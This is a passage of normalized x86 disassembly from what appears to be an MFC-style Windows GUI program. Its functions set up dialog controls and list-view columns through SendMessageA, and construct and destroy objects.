mov [ fs : 0x0 ] ecx
add esp 0x14
retn 0x8
sub_40b030
push esi
push edi
mov esi ecx
call sub_43e113
push 0xffffffff
push 0xffffffff
lea edi [ esi + 0x5c ]
push 0x0
push rw-data
push 0x0
mov ecx edi
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x1
mov ecx edi
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x2
mov ecx edi
call sub_43c126
mov eax [ esi + 0x78 ]
mov edi [ SendMessageA@IAT ]
push 0x3c
push 0x0
push 0x101e
push eax
call edi
mov ecx [ esi + 0x78 ]
push 0xa0
push 0x1
push 0x101e
push ecx
call edi
mov edx [ esi + 0x78 ]
push 0xf0
push 0x2
push 0x101e
push edx
call edi
mov eax [ esi + 0x78 ]
push 0x21
push 0x0
push 0x1036
push eax
call edi
push 0x0
lea ecx [ esi + 0x98 ]
call sub_441841
push 0x0
lea ecx [ esi + 0xd4 ]
call sub_441841
push 0x0
lea ecx [ esi + 0x14c ]
call sub_441841
push 0x0
lea ecx [ esi + 0x110 ]
call sub_441841
mov ecx esi
call sub_40b110
pop edi
mov eax 0x1
pop esi
retn
sub_40b110
push 0xffffffff
push sub_45da18
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ebx
push ebp
mov ebp [ SendMessageA@IAT ]
push esi
push edi
mov esi ecx
xor edi edi
mov eax [ esi + 0x78 ]
push edi
push edi
push 0x1009
push eax
call ebp
mov ecx [ esi + 0x78 ]
push edi
push edi
push 0xb
push ecx
call ebp
push 0x1
mov ecx esi
call sub_440b18
mov edx [ rw-data ]
mov [ esp + 0x10 ] edx
lea eax [ esp + 0x10 ]
push rw-data
push eax
mov [ esp + 0x24 ] edi
call sub_43b5cc
mov eax [ esp + 0x18 ]
mov edx [ esi + 0x194 ]
add esp 0x8
lea ebx [ esi + 0x194 ]
mov ecx ebx
push edi
push eax
push 0xffffffff
call [ edx + 0xc ]
test eax eax
jne r-xdata
cmp [ esi + 0x25c ] edi
jne r-xdata
push edi
push rw-data
push rw-data
mov ecx esi
call sub_43fe9c
jmp r-xdata
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x10 ]
mov ecx [ esi + 0x78 ]
push 0x0
push 0x1
push 0xb
push ecx
call ebp
push 0x0
lea ecx [ esi + 0x98 ]
call sub_441841
push 0x1
lea ecx [ esi + 0xd4 ]
call sub_441841
push 0x0
lea ecx [ esi + 0x14c ]
call sub_441841
push 0x0
lea ecx [ esi + 0x110 ]
call sub_441841
lea ebp [ esi + 0x5c ]
lea ecx [ esp + 0x10 ]
mov [ esp + 0x1c ] 0xffffffff
call sub_442148
mov ecx [ esp + 0x14 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov eax [ esi + 0x2a4 ]
push 0x0
push 0x0
push 0x0
push 0x0
push eax
push edi
push 0x1
mov ecx ebp
call sub_43c179
mov eax [ esi + 0x2a8 ]
mov ecx ebp
push eax
push 0x1
push edi
call sub_43c1c5
mov eax [ esi + 0x2ac ]
mov ecx ebp
push eax
push 0x2
push edi
call sub_43c1c5
mov edx [ ebx ]
push 0x1
push 0x1
mov ecx ebx
inc edi
call [ edx + 0x14 ]
mov eax [ esi + 0x25c ]
test eax eax
je r-xdata
mov ebp [ SendMessageA@IAT ]
sub_40b290
push 0xffffffff
push sub_45da62
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
push ebp
push esi
push edi
mov esi ecx
push eax
mov [ esp + 0x10 ] esi
call sub_421517
mov edx [ rw-data ]
lea ecx [ esi + 0x110 ]
mov [ esp + 0x18 ] 0x0
mov [ ecx ] edx
mov eax [ rw-data ]
lea edi [ esi + 0x114 ]
mov [ edi ] eax
mov edx [ rw-data ]
lea ebp [ esi + 0x118 ]
mov [ ebp ] edx
push rw-data
mov [ esp + 0x1c ] 0x3
mov [ esi ] r--data
call sub_4422d1
push rw-data
mov ecx edi
call sub_4422d1
push rw-data
mov ecx ebp
call sub_4422d1
mov ecx [ esp + 0x10 ]
mov [ esi + 0x14 ] 0x3
mov [ esi + 0x8c ] 0x1
mov eax esi
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_40b390
push esi
mov esi ecx
push edi
mov edi [ esp + 0xc ]
push 0x0
push 0xc
lea eax [ esi + 0x110 ]
push 0xff
push eax
push rw-data
push edi
mov [ edi + 0x8 ] 0x0
call sub_4246fa
push 0x0
push 0xc
lea ecx [ esi + 0x114 ]
push 0xff
push ecx
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
add esi 0x118
push 0xff
push esi
push rw-data
push edi
call sub_4246fa
pop edi
pop esi
retn 0x4
sub_40b400
push 0xffffffff
push sub_45dae5
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
push ebx
push esi
push edi
mov esi ecx
push eax
push 0x8c
mov [ esp + 0x14 ] esi
call sub_43ddd5
lea edi [ esi + 0x5c ]
mov [ esp + 0x18 ] 0x0
mov ecx edi
call sub_43e388
mov [ edi ] r--data
lea edi [ esi + 0x98 ]
mov [ esp + 0x18 ] 0x1
mov ecx edi
call sub_43e388
mov [ edi ] r--data
lea edi [ esi + 0xd4 ]
mov [ esp + 0x18 ] 0x2
mov ecx edi
call sub_43e388
mov [ edi ] r--data
lea edi [ esi + 0x110 ]
mov [ esp + 0x18 ] 0x3
mov ecx edi
call sub_43e388
mov [ edi ] r--data
lea edi [ esi + 0x14c ]
mov [ esp + 0x18 ] 0x4
mov ecx edi
call sub_43e388
mov [ edi ] r--data
mov ecx [ rw-data ]
lea edi [ esi + 0x188 ]
mov [ edi ] ecx
mov edx [ rw-data ]
lea ebx [ esi + 0x18c ]
mov [ ebx ] edx
push 0x0
lea ecx [ esi + 0x190 ]
mov [ esp + 0x1c ] 0x7
call sub_40bf00
push rw-data
mov ecx edi
mov [ esp + 0x1c ] 0x8
mov [ esi ] r--data
call sub_4422d1
push rw-data
mov ecx ebx
call sub_4422d1
mov ecx [ esp + 0x10 ]
mov eax esi
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_40b530
push 0xffffffff
push sub_45db06
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
lea ecx [ esi + 0x114 ]
mov [ esp + 0x10 ] 0x1
call sub_442148
lea ecx [ esi + 0x110 ]
mov [ esp + 0x10 ] 0x0
call sub_442148
mov ecx esi
mov [ esp + 0x10 ] 0xffffffff
call sub_421723
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_40b590
push 0xffffffff
push sub_45db8d
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push esi
mov esi ecx
push edi
mov [ esp + 0x8 ] esi
mov [ esp + 0x18 ] 0x0
lea edi [ esi + 0x190 ]
mov [ esp + 0xc ] edi
lea ecx [ edi + 0x114 ]
mov [ esp + 0x18 ] 0x9
call sub_442148
lea ecx [ edi + 0x110 ]
mov [ esp + 0x18 ] 0x8
call sub_442148
mov ecx edi
mov [ esp + 0x18 ] 0x7
call sub_421723
lea ecx [ esi + 0x18c ]
mov [ esp + 0x18 ] 0x6
call sub_442148
lea ecx [ esi + 0x188 ]
mov [ esp + 0x18 ] 0x5
call sub_442148
lea ecx [ esi + 0x14c ]
mov [ esp + 0x18 ] 0x4
call sub_44f046
lea ecx [ esi + 0x110 ]
mov [ esp + 0x18 ] 0x3
call sub_44f046
lea ecx [ esi + 0xd4 ]
mov [ esp + 0x18 ] 0x2
call sub_44f046
lea ecx [ esi + 0x98 ]
mov [ esp + 0x18 ] 0x1
call sub_44f046
lea ecx [ esi + 0x5c ]
mov [ esp + 0x18 ] 0x0
call sub_43c0ee
mov ecx esi
mov [ esp + 0x18 ] 0xffffffff
call sub_43da87
mov ecx [ esp + 0x10 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
sub_40b680
push esi
mov esi ecx
push edi
mov edi [ esp + 0xc ]
lea eax [ esi + 0x5c ]
push eax
push 0x3e9
push edi
call sub_449556
lea ecx [ esi + 0x98 ]
push ecx
push 0x3ed
push edi
call sub_449556
lea edx [ esi + 0xd4 ]
push edx
push 0x3e8
push edi
call sub_449556
lea eax [ esi + 0x110 ]
push eax
push 0x3ef
push edi
call sub_449556
lea ecx [ esi + 0x14c ]
push ecx
push 0x3ee
push edi
call sub_449556
lea edx [ esi + 0x188 ]
push edx
push 0x3ea
push edi
call sub_4493f1
add esi 0x18c
push esi
push 0x3eb
push edi
call sub_4493f1
pop edi
pop esi
retn 0x4
sub_40b720
push esi
push edi
mov esi ecx
call sub_43e113
push 0xffffffff
push 0xffffffff
lea edi [ esi + 0x5c ]
push 0x0
push rw-data
push 0x0
mov ecx edi
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x1
mov ecx edi
call sub_43c126
mov eax [ esi + 0x78 ]
mov edi [ SendMessageA@IAT ]
push 0x50
push 0x0
push 0x101e
push eax
call edi
mov ecx [ esi + 0x78 ]
push 0xa0
push 0x1
push 0x101e
push ecx
call edi
mov edx [ esi + 0x78 ]
push 0x21
push 0x0
push 0x1036
push edx
call edi
push 0x0
lea ecx [ esi + 0x98 ]
call sub_441841
push 0x0
lea ecx [ esi + 0xd4 ]
call sub_441841
push 0x0
lea ecx [ esi + 0x14c ]
call sub_441841
push 0x0
lea ecx [ esi + 0x110 ]
call sub_441841
mov ecx esi
call sub_40b7d0
pop edi
mov eax 0x1
pop esi
retn
sub_40b7d0
push 0xffffffff
push sub_45dba8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ebx
push ebp
mov ebp [ SendMessageA@IAT ]
push esi
mov esi ecx
xor ebx ebx
push edi
push ebx
mov eax [ esi + 0x78 ]
push ebx
push 0x1009
push eax
call ebp
mov ecx [ esi + 0x78 ]
push ebx
push ebx
push 0xb
push ecx
call ebp
push 0x1
mov ecx esi
call sub_440b18
mov edx [ rw-data ]
mov [ esp + 0x10 ] edx
lea eax [ esp + 0x10 ]
push rw-data
push eax
mov [ esp + 0x24 ] ebx
call sub_43b5cc
mov eax [ esp + 0x18 ]
mov edx [ esi + 0x190 ]
add esp 0x8
lea edi [ esi + 0x190 ]
mov ecx edi
push ebx
push eax
push 0xffffffff
call [ edx + 0xc ]
test eax eax
jne r-xdata
cmp [ esi + 0x258 ] ebx
jne r-xdata
push ebx
push rw-data
push rw-data
mov ecx esi
call sub_43fe9c
jmp r-xdata
mov eax [ edi ]
mov ecx edi
call [ eax + 0x10 ]
mov ecx [ esi + 0x78 ]
push 0x0
push 0x1
push 0xb
push ecx
call ebp
push 0x0
lea ecx [ esi + 0x98 ]
call sub_441841
push 0x1
lea ecx [ esi + 0xd4 ]
call sub_441841
push 0x0
lea ecx [ esi + 0x14c ]
call sub_441841
push 0x0
lea ecx [ esi + 0x110 ]
call sub_441841
lea ebp [ esi + 0x5c ]
lea ecx [ esp + 0x10 ]
mov [ esp + 0x1c ] 0xffffffff
call sub_442148
mov ecx [ esp + 0x14 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov eax [ esi + 0x2a0 ]
push 0x0
push 0x0
push 0x0
push 0x0
push eax
push ebx
push 0x1
mov ecx ebp
call sub_43c179
mov eax [ esi + 0x2a4 ]
mov ecx ebp
push eax
push 0x1
push ebx
call sub_43c1c5
mov edx [ edi ]
push 0x1
push 0x1
mov ecx edi
inc ebx
call [ edx + 0x14 ]
mov eax [ esi + 0x258 ]
test eax eax
je r-xdata
mov ebp [ SendMessageA@IAT ]
sub_40b930
push 0xffffffff
push sub_45dbd0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
mov eax [ rw-data ]
push esi
push edi
mov esi ecx
mov [ esp + 0x8 ] eax
push 0x1
mov [ esp + 0x1c ] 0x0
call sub_440b18
mov ecx [ esi + 0x78 ]
push 0x0
push 0x0
push 0x1042
push ecx
call [ SendMessageA@IAT ]
push 0x0
lea edx [ esp + 0x10 ]
push eax
push edx
lea ecx [ esi + 0x5c ]
call sub_43c1f0
mov eax [ eax ]
lea ecx [ esp + 0x8 ]
push eax
push rw-data
push ecx
mov [ esp + 0x24 ] 0x1
call sub_43b5cc
add esp 0xc
lea ecx [ esp + 0xc ]
mov [ esp + 0x18 ] 0x0
call sub_442148
mov eax [ esp + 0x8 ]
mov edx [ esi + 0x190 ]
lea edi [ esi + 0x190 ]
push 0x0
push eax
push 0xffffffff
mov ecx edi
call [ edx + 0xc ]
test eax eax
jne r-xdata
lea ecx [ esi + 0x2a4 ]
push ecx
lea ecx [ esi + 0x18c ]
call sub_442281
lea edx [ esi + 0x2a0 ]
lea ecx [ esi + 0x188 ]
push edx
call sub_442281
mov eax [ edi ]
mov ecx edi
call [ eax + 0x10 ]
push 0x0
mov ecx esi
call sub_440b18
push 0x0
lea ecx [ esi + 0x98 ]
call sub_441841
push 0x1
lea ecx [ esi + 0xd4 ]
call sub_441841
push 0x1
lea ecx [ esi + 0x14c ]
call sub_441841
push 0x1
lea ecx [ esi + 0x110 ]
call sub_441841
mov ecx [ esp + 0x24 ]
mov [ ecx ] 0x0
push eax
push rw-data
push rw-data
mov ecx esi
call sub_43fe9c
jmp r-xdata
lea ecx [ esp + 0x8 ]
mov [ esp + 0x18 ] 0xffffffff
call sub_442148
mov ecx [ esp + 0x10 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x14
retn 0x8
sub_40ba80
push 0xffffffff
push sub_45dbe8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ebx
push ebp
push esi
push edi
mov edi ecx
push 0x1
call sub_440b18
mov eax [ edi + 0x18c ]
lea ebp [ edi + 0x18c ]
push rw-data
push eax
call sub_42d51e
add esp 0x8
test eax eax
jne r-xdata
mov eax [ edi + 0x188 ]
lea ebx [ edi + 0x188 ]
push rw-data
push eax
call sub_42d51e
add esp 0x8
test eax eax
jne r-xdata
push eax
push eax
push rw-data
call sub_4496b7
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov eax [ rw-data ]
mov [ esp + 0x10 ] eax
mov ecx [ ebx ]
lea edx [ esp + 0x10 ]
push ecx
push rw-data
push edx
mov [ esp + 0x28 ] 0x0
call sub_43b5cc
mov ecx [ esp + 0x1c ]
mov eax [ edi + 0x190 ]
add esp 0xc
lea esi [ edi + 0x190 ]
push 0x0
push ecx
push 0xffffffff
mov ecx esi
call [ eax + 0xc ]
test eax eax
jne r-xdata
push eax
push eax
push rw-data
call sub_4496b7
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov eax [ edi + 0x22c ]
test eax eax
je r-xdata
push eax
push rw-data
push rw-data
mov ecx edi
call sub_43fe9c
jmp r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0x20 ]
push ebp
lea ecx [ edi + 0x2a4 ]
call sub_442281
push ebx
lea ecx [ edi + 0x2a0 ]
call sub_442281
mov edx [ esi ]
mov ecx esi
call [ edx + 0x28 ]
mov eax [ esi ]
mov ecx esi
call [ eax + 0x10 ]
mov ecx edi
call sub_40b7d0
push 0x0
push 0x0
push rw-data
call sub_4496b7
push rw-data
mov ecx ebx
call sub_4422d1
push 0x0
mov ecx edi
call sub_440b18
mov edx [ esi ]
mov ecx esi
call [ edx + 0x10 ]
jmp r-xdata
lea ecx [ esp + 0x10 ]
mov [ esp + 0x1c ] 0xffffffff
call sub_442148
mov ecx [ esp + 0x14 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_40bc10
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_45dc10
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push ebx
push ebp
push esi
push edi
mov esi ecx
push 0x1
call sub_440b18
mov eax [ esi + 0x78 ]
push 0x0
push 0x0
push 0x1042
push eax
call [ SendMessageA@IAT ]
mov edi eax
test edi edi
jge r-xdata
mov eax [ esi + 0x18c ]
lea ebx [ esi + 0x18c ]
push rw-data
push eax
call sub_42d51e
add esp 0x8
test eax eax
jne r-xdata
push 0x0
push 0x0
push rw-data
mov ecx esi
call sub_43fe9c
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x8 ]
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
mov eax [ esi + 0x188 ]
lea ebp [ esi + 0x188 ]
push rw-data
push eax
call sub_42d51e
add esp 0x8
test eax eax
jne r-xdata
push eax
push eax
push rw-data
call sub_4496b7
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x8 ]
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
mov ecx [ rw-data ]
mov [ esp + 0x10 ] ecx
push 0x0
lea edx [ esp + 0x18 ]
push edi
push edx
lea ecx [ esi + 0x5c ]
mov [ esp + 0x2c ] 0x0
call sub_43c1f0
mov eax [ eax ]
lea ecx [ esp + 0x10 ]
push eax
push rw-data
push ecx
mov [ esp + 0x2c ] 0x1
call sub_43b5cc
add esp 0xc
lea ecx [ esp + 0x14 ]
mov [ esp + 0x20 ] 0x0
call sub_442148
mov eax [ esp + 0x10 ]
mov edx [ esi + 0x190 ]
lea edi [ esi + 0x190 ]
push 0x0
push eax
push 0xffffffff
mov ecx edi
call [ edx + 0xc ]
test eax eax
jne r-xdata
push eax
push eax
push rw-data
call sub_4496b7
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x8 ]
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
mov edx [ edi ]
mov ecx edi
call [ edx + 0x24 ]
push ebx
lea ecx [ esi + 0x2a4 ]
call sub_442281
push ebp
lea ecx [ esi + 0x2a0 ]
call sub_442281
mov eax [ edi ]
mov ecx edi
call [ eax + 0x28 ]
mov edx [ edi ]
mov ecx edi
call [ edx + 0x10 ]
mov ecx esi
call sub_40b7d0
push eax
push rw-data
push rw-data
mov ecx esi
call sub_43fe9c
jmp r-xdata
lea ecx [ esp + 0x10 ]
mov [ esp + 0x20 ] 0xffffffff
call sub_442148
mov ecx [ esp + 0x18 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
sub_40bdc0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_45dc30
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push esi
mov esi ecx
push edi
push 0x0
mov eax [ esi + 0x78 ]
push 0x0
push 0x1042
push eax
call [ SendMessageA@IAT ]
test eax eax
jge r-xdata
mov ecx [ rw-data ]
mov [ esp + 0x8 ] ecx
push 0x0
lea edx [ esp + 0x10 ]
push eax
push edx
lea ecx [ esi + 0x5c ]
mov [ esp + 0x24 ] 0x0
call sub_43c1f0
mov eax [ eax ]
lea ecx [ esp + 0x8 ]
push eax
push rw-data
push ecx
mov [ esp + 0x24 ] 0x1
call sub_43b5cc
add esp 0xc
lea ecx [ esp + 0xc ]
mov [ esp + 0x18 ] 0x0
call sub_442148
mov eax [ esp + 0x8 ]
mov edx [ esi + 0x190 ]
lea edi [ esi + 0x190 ]
push 0x0
push eax
push 0xffffffff
mov ecx edi
call [ edx + 0xc ]
test eax eax
jne r-xdata
push 0x0
push 0x0
push rw-data
mov ecx esi
call sub_43fe9c
pop edi
pop esi
mov ecx [ esp + 0x8 ]
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
mov edx [ edi ]
mov ecx edi
call [ edx + 0x2c ]
mov eax [ edi ]
mov ecx edi
call [ eax + 0x10 ]
mov ecx esi
call sub_40b7d0
push rw-data
lea ecx [ esi + 0x18c ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x188 ]
call sub_4422d1
push 0x0
mov ecx esi
call sub_440b18
push eax
push rw-data
push rw-data
mov ecx esi
call sub_43fe9c
jmp r-xdata
lea ecx [ esp + 0x8 ]
mov [ esp + 0x18 ] 0xffffffff
call sub_442148
mov ecx [ esp + 0x10 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
sub_40bf00
push 0xffffffff
push sub_45dc64
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
push esi
push edi
mov esi ecx
push eax
mov [ esp + 0xc ] esi
call sub_421517
mov edx [ rw-data ]
lea ecx [ esi + 0x110 ]
mov [ esp + 0x14 ] 0x0
mov [ ecx ] edx
mov eax [ rw-data ]
lea edi [ esi + 0x114 ]
mov [ edi ] eax
push rw-data
mov [ esp + 0x18 ] 0x2
mov [ esi ] r--data
call sub_4422d1
push rw-data
mov ecx edi
call sub_4422d1
mov ecx [ esp + 0xc ]
mov [ esi + 0x14 ] 0x2
mov [ esi + 0x8c ] 0x1
mov eax esi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_40bff0
push 0xffffffff
push sub_45dcd7
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
push esi
push edi
mov esi ecx
push eax
push 0x8d
mov [ esp + 0x10 ] esi
call sub_43ddd5
lea edi [ esi + 0x5c ]
mov [ esp + 0x14 ] 0x0
mov ecx edi
call sub_43e388
mov [ edi ] r--data
lea edi [ esi + 0x98 ]
mov [ esp + 0x14 ] 0x1
mov ecx edi
call sub_43e388
mov [ edi ] r--data
lea edi [ esi + 0xd4 ]
mov [ esp + 0x14 ] 0x2
mov ecx edi
call sub_43e388
mov [ edi ] r--data
lea edi [ esi + 0x110 ]
mov [ esp + 0x14 ] 0x3
mov ecx edi
call sub_43e388
mov [ edi ] r--data
lea edi [ esi + 0x14c ]
mov [ esp + 0x14 ] 0x4
mov ecx edi
call sub_43e388
mov [ edi ] r--data
mov ecx [ rw-data ]
lea edi [ esi + 0x188 ]
mov [ edi ] ecx
push 0x0
lea ecx [ esi + 0x18c ]
mov [ esp + 0x18 ] 0x6
call sub_40c9c0
push rw-data
mov ecx edi
mov [ esp + 0x18 ] 0x7
mov [ esi ] r--data
call sub_4422d1
mov ecx [ esp + 0xc ]
mov eax esi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_40c110
push 0xffffffff
push sub_45dcf8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
lea ecx [ esi + 0x114 ]
mov [ esp + 0x10 ] 0x0
call sub_442148
mov ecx esi
mov [ esp + 0x10 ] 0xffffffff
call sub_421723
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_40c160
push 0xffffffff
push sub_45dd71
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push esi
mov esi ecx
push edi
mov [ esp + 0x8 ] esi
mov [ esp + 0x18 ] 0x0
lea edi [ esi + 0x18c ]
mov [ esp + 0xc ] edi
lea ecx [ edi + 0x114 ]
mov [ esp + 0x18 ] 0x7
call sub_442148
mov ecx edi
mov [ esp + 0x18 ] 0x6
call sub_421723
lea ecx [ esi + 0x188 ]
mov [ esp + 0x18 ] 0x5
call sub_442148
lea ecx [ esi + 0x14c ]
mov [ esp + 0x18 ] 0x4
call sub_44f046
lea ecx [ esi + 0x110 ]
mov [ esp + 0x18 ] 0x3
call sub_44f046
lea ecx [ esi + 0xd4 ]
mov [ esp + 0x18 ] 0x2
call sub_44f046
lea ecx [ esi + 0x98 ]
mov [ esp + 0x18 ] 0x1
call sub_44f046
lea ecx [ esi + 0x5c ]
mov [ esp + 0x18 ] 0x0
call sub_43c0ee
mov ecx esi
mov [ esp + 0x18 ] 0xffffffff
call sub_43da87
mov ecx [ esp + 0x10 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
sub_40c230
push esi
mov esi ecx
push edi
mov edi [ esp + 0xc ]
lea eax [ esi + 0x5c ]
push eax
push 0x3e9
push edi
call sub_449556
lea ecx [ esi + 0x98 ]
push ecx
push 0x3ed
push edi
call sub_449556
lea edx [ esi + 0xd4 ]
push edx
push 0x3e8
push edi
call sub_449556
lea eax [ esi + 0x110 ]
push eax
push 0x3ef
push edi
call sub_449556
lea ecx [ esi + 0x14c ]
push ecx
push 0x3ee
push edi
call sub_449556
add esi 0x188
push esi
push 0x3eb
push edi
call sub_4493f1
pop edi
pop esi
retn 0x4
sub_40c2c0
push esi
push edi
mov esi ecx
call sub_43e113
push 0xffffffff
push 0xffffffff
lea edi [ esi + 0x5c ]
push 0x0
push rw-data
push 0x0
mov ecx edi
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x1
mov ecx edi
call sub_43c126
mov eax [ esi + 0x78 ]
mov edi [ SendMessageA@IAT ]
push 0x50
push 0x0
push 0x101e
push eax
call edi
mov ecx [ esi + 0x78 ]
push 0xa0
push 0x1
push 0x101e
push ecx
call edi
mov edx [ esi + 0x78 ]
push 0x21
push 0x0
push 0x1036
push edx
call edi
push 0x0
lea ecx [ esi + 0x98 ]
call sub_441841
push 0x0
lea ecx [ esi + 0xd4 ]
call sub_441841
push 0x0
lea ecx [ esi + 0x14c ]
call sub_441841
push 0x0
lea ecx [ esi + 0x110 ]
call sub_441841
mov ecx esi
call sub_40c370
pop edi
mov eax 0x1
pop esi
retn
sub_40c370
push 0xffffffff
push sub_45dd88
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x18
push ebx
push ebp
mov ebp [ SendMessageA@IAT ]
push esi
mov esi ecx
xor ebx ebx
push edi
push ebx
mov eax [ esi + 0x78 ]
push ebx
push 0x1009
push eax
call ebp
mov ecx [ esi + 0x78 ]
push ebx
push ebx
push 0xb
push ecx
call ebp
push 0x1
mov ecx esi
call sub_440b18
mov edx [ rw-data ]
mov [ esp + 0x10 ] edx
lea eax [ esp + 0x10 ]
push rw-data
push eax
mov [ esp + 0x38 ] ebx
call sub_43b5cc
mov eax [ esp + 0x18 ]
mov edx [ esi + 0x18c ]
add esp 0x8
lea edi [ esi + 0x18c ]
mov ecx edi
push ebx
push eax
push 0xffffffff
call [ edx + 0xc ]
test eax eax
jne r-xdata
cmp [ esi + 0x254 ] ebx
jne r-xdata
push ebx
push rw-data
push rw-data
mov ecx esi
call sub_43fe9c
jmp r-xdata
mov eax [ edi ]
mov ecx edi
call [ eax + 0x10 ]
mov ecx [ esi + 0x78 ]
push 0x0
push 0x1
push 0xb
push ecx
call ebp
push 0x0
lea ecx [ esi + 0x98 ]
call sub_441841
push 0x1
lea ecx [ esi + 0xd4 ]
call sub_441841
push 0x0
lea ecx [ esi + 0x14c ]
call sub_441841
push 0x0
lea ecx [ esi + 0x110 ]
call sub_441841
lea ebp [ esi + 0x5c ]
lea ecx [ esp + 0x10 ]
mov [ esp + 0x30 ] 0xffffffff
call sub_442148
mov ecx [ esp + 0x28 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x24
retn
mov edx [ esi + 0x29c ]
lea ecx [ esp + 0x14 ]
push 0xa
push ecx
push edx
call sub_42d656
add esp 0xc
lea eax [ esp + 0x14 ]
mov ecx ebp
push 0x0
push 0x0
push 0x0
push 0x0
push eax
push ebx
push 0x1
call sub_43c179
mov eax [ esi + 0x2a0 ]
mov ecx ebp
push eax
push 0x1
push ebx
call sub_43c1c5
mov edx [ edi ]
push 0x1
push 0x1
mov ecx edi
inc ebx
call [ edx + 0x14 ]
mov eax [ esi + 0x254 ]
test eax eax
je r-xdata
mov ebp [ SendMessageA@IAT ]
sub_40c4e0
push 0xffffffff
push sub_45ddb0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
mov eax [ rw-data ]
push esi
push edi
mov esi ecx
mov [ esp + 0x8 ] eax
push 0x1
mov [ esp + 0x1c ] 0x0
call sub_440b18
mov ecx [ esi + 0x78 ]
push 0x0
push 0x0
push 0x1042
push ecx
call [ SendMessageA@IAT ]
push 0x0
lea edx [ esp + 0x10 ]
push eax
push edx
lea ecx [ esi + 0x5c ]
call sub_43c1f0
mov eax [ eax ]
lea ecx [ esp + 0x8 ]
push eax
push rw-data
push ecx
mov [ esp + 0x24 ] 0x1
call sub_43b5cc
add esp 0xc
lea ecx [ esp + 0xc ]
mov [ esp + 0x18 ] 0x0
call sub_442148
mov eax [ esp + 0x8 ]
mov edx [ esi + 0x18c ]
lea edi [ esi + 0x18c ]
push 0x0
push eax
push 0xffffffff
mov ecx edi
call [ edx + 0xc ]
test eax eax
jne r-xdata
lea ecx [ esi + 0x2a0 ]
push ecx
lea ecx [ esi + 0x188 ]
call sub_442281
mov edx [ edi ]
mov ecx edi
call [ edx + 0x10 ]
push 0x0
mov ecx esi
call sub_440b18
push 0x0
lea ecx [ esi + 0x98 ]
call sub_441841
push 0x1
lea ecx [ esi + 0xd4 ]
call sub_441841
push 0x1
lea ecx [ esi + 0x14c ]
call sub_441841
push 0x1
lea ecx [ esi + 0x110 ]
call sub_441841
mov eax [ esp + 0x24 ]
mov [ eax ] 0x0
push eax
push rw-data
push rw-data
mov ecx esi
call sub_43fe9c
jmp r-xdata
